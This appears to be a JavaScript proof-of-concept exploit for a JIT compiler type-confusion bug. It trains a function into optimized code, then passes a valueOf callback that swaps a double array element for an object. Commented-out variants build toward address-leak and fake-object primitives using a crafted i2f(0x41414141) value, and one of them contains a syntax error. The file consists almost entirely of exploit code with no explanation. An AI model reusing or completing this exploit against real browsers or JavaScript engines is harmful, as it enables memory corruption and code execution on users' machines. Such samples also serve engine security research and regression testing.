"use strict";

function func(a, b, c) {
    a[0] = 1.2;
    b[0] = c; // <<<<----------------------- (1)
    a[1] = 2.2;
    a[0] = 2.3023e-320;
}

function main() {
    var a = [1.1, 2.2];
    var b = new Uint32Array(100);

    // force to optimize
    for (var i = 0; i < 0x10000; i++)
        func(a, b, i);

    func(a, b, {valueOf: () => {
        a[0] = {}; // <<<<----------------------- (2)
        return 0;
    }});

    a[0].toString();
}

main();


// function opt(a,b,c){
//     a[0] = 1.2;
//     b[0] = c;
//     return a[0];
// }

// let a = [1.1,2.2];
// let b = new Uint32Array(100);

// for(let i = 0; i<0x10000; i++)
//     opt(a,b,i);

// let leak = opt(a,b,{valueOf:()=>{
//     a[0] = {};
//     return 0;
// }});

/**
function opt(a,b,c,d){
    a[0] = 1.2;
    b[0] = c;
    a[0] = d;
}

let a = [1.1,2.2];
let b = new Uint32Array(100);

for (let i = 0, i < 0x10000; i++)
    opt(a,b,i,1.1);

opt(a,b,{valueOf: () => {
    a[0] = {};
    return 0;
}},i2f(0x41414141));

let fakeobj = a[0];

 * 
 */
